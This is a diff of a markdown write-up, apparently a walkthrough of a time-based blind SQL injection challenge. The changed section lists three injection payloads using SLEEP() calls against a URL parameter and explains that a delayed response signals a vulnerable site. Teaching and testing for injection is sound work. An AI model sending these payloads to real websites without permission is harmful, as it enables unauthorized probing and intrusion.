@@ -16,13 +16,14 @@ description: "SQL Injection – Time-Based Bl - A walkthrough of the challenge w
 
 **<u>To test for time-based sqli:</u>**
 Example:
+
 ```bash
 http://domain.com/index.php?id=15'XOR(if(now()=sysdate(),sleep(5\*5),0))OR'
 ```
 or use:
 **' OR SLEEP(5) AND '1'='1**
 or
-**'AND (SELECT \* FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe**
+**'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe**
 
 If the websites hangs for a bit, it means it is vulnerable to this kind of attack
 
